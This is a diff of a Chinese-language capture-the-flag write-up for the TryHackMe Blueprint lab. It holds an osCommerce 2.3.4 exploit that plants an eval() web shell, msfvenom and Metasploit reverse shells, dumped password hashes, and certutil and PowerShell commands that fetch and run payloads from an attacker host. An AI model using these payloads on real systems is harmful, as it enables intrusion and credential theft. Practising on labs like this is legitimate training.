@@ -4,12 +4,12 @@
 # 服务探测
 ```
 ┌──(root💀kali)-[~/tryhackme/Blueprint]
-└─# nmap -sV -Pn 10.10.251.204    
+└─# nmap -sV -Pn 10.10.3.110    
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-16 03:34 EST
 Stats: 0:02:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 69.23% done; ETC: 03:37 (0:00:29 remaining)
-Nmap scan report for 10.10.251.204
+Nmap scan report for 10.10.3.110
 Host is up (0.47s latency).
 Not shown: 987 closed ports
 PORT      STATE SERVICE      VERSION
@@ -32,12 +32,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 172.68 seconds
 
 ```
-
+## 服务分析
 可以看到开了3个http服务，一个共享服务以及若干rpc服务
 
 浏览器依次打开80和443端口服务，首页都报错。
 
-8080服务显示有一个叫```oscommerce-2.3.4```的web app，版本是```2.3.4```
+8080服务显示有一个叫```oscommerce```的web app，版本是```2.3.4```
 
 在kali搜索这个web app的漏洞情况：
 ```
@@ -60,6 +60,8 @@ Shellcodes: No Results
 
 可以说满满都是漏洞，包括sql注入，文件上传，远程代码执行等。
 
+
+## 攻击
 我们把远程代码执行攻击脚本拷贝到本地，经过测试目标系统php禁用了```system```函数，但是```passthru```函数是可以使用的。
 
 我们输入```whoami```
@@ -68,19 +70,21 @@ Shellcodes: No Results
 
 nice,直接最高权限。
 
+在这里我卡了非常久，因为我不能直接用powershell反弹shell到我的kali。
 
+后面只好转变思路，既然反弹不了，那直接写一句话木马到靶机，还好eval函数也是可以使用的，攻击代码修改如下：
 ```
 import requests
 
-base_url = "http://10.10.251.204:8080/oscommerce-2.3.4/catalog/"
-target_url = "http://10.10.251.204:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
+base_url = "http://10.10.3.110:8080/oscommerce-2.3.4/catalog/"
+target_url = "http://10.10.3.110:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
 
 data = {
     'DIR_FS_DOCUMENT_ROOT': './'
 }
 
 payload = '\');'
-payload += 'passthru("ping 10.13.21.169");'    # 
+payload += """eval(@$_POST['cmd']);""" 
 payload += '/*'
 
 data['DB_DATABASE'] = payload
@@ -92,22 +96,140 @@ if r.status_code == 200:
 else:
     print("[-] Exploit did not execute as planned")
 ```
+执行完上面的攻击脚本。到msf找到中国菜刀模块，填好参数：
+```
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > options
+
+Module options (exploit/multi/http/caidao_php_backdoor_exec):
+
+   Name       Current Setting                                           Required  Description
+   ----       ---------------                                           --------  -----------
+   PASSWORD   cmd                                                       yes       The password of backdoor
+   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.3.110                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      8080                                                      yes       The target port (TCP)
+   SSL        false                                                     no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /oscommerce-2.3.4/catalog/install/includes/configure.php  yes       The path of backdoor
+   VHOST                                                                no        HTTP server virtual host
 
 
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  tun0             yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
 
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169 LPORT=4242 -f exe > reverse.exe
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+```
 
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/reverse.exe','C:\temp\reverse.exe')"
+攻击，拿到初始shell，查看是最高的system权限：
+```
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > run
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile('https://www.baidu.com/','C:\temp\reverse.exe')"
+[*] Started reverse TCP handler on 10.13.21.169:4444 
+[*] Sending exploit...
+[*] Sending stage (39282 bytes) to 10.10.3.110
+[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.3.110:49346) at 2021-11-17 04:10:33 -0500
+
+meterpreter > getuid
+Server username: SYSTEM (0)
+
+```
+
+啃爹的是这个菜刀模块没有hashdump命令，我们只好编译另一个功能完整的payload
 
 
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.13.21.169:8000/powercat.ps1');powercat -c 10.13.21.169 -p 4242 -e cmd"
+```
+┌──(root💀kali)-[~/tryhackme/Blueprint]
+└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169 LPORT=4242 -f exe > reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+```
+
+上传到靶机以后，执行：
+```
+meterpreter > upload /root/tryhackme/Blueprint/reverse.exe
+[*] uploading  : /root/tryhackme/Blueprint/reverse.exe -> reverse.exe
+[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): /root/tryhackme/Blueprint/reverse.exe -> reverse.exe
+[*] uploaded   : /root/tryhackme/Blueprint/reverse.exe -> reverse.exe
+meterpreter > execute -f reverse.exe
+Process 4668 created.
+
+```
 
 
-powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+在另一个msf拿到一个完整功能的shell：
+```
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
 
 
-php -r '$sock=fsockopen("10.13.21.169",4242);passthru("cmd.exe");
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.13.21.169     yes       The listen address (an interface may be specified)
+   LPORT     4242             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.13.21.169:4242 
+[*] Sending stage (175174 bytes) to 10.10.3.110
+[*] Meterpreter session 1 opened (10.13.21.169:4242 -> 10.10.3.110:49350) at 2021-11-17 04:39:12 -0500
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+```
+
+把上面lab哈希密码的这一段```30e87bf999828446a1c1209ddde4c450```拿到[这个网站](https://www.somd5.com/)破解得到明文密码。
+
+
+拿到root.txt
+```
+meterpreter > pwd
+C:\Users\Administrator\Desktop
+meterpreter > ls
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  282   fil   2019-04-11 18:36:47 -0400  desktop.ini
+100666/rw-rw-rw-  37    fil   2019-11-27 13:15:37 -0500  root.txt.txt
+
+```
+
+# 又
+
+看大佬的文章，攻击阶段下面的payload是可以从攻击机上传文件到靶机的，在这里记录一下：
+```
+payload = '\');'
+payload += '$var = shell_exec("cmd.exe /C certutil.exe -urlcache -split -f http://10.8.1.72/shell.exe shell.exe & shell.exe & nslookup test 10.8.1.72 ");' 
+payload += 'echo $var;'
+payload += '/*'
+```
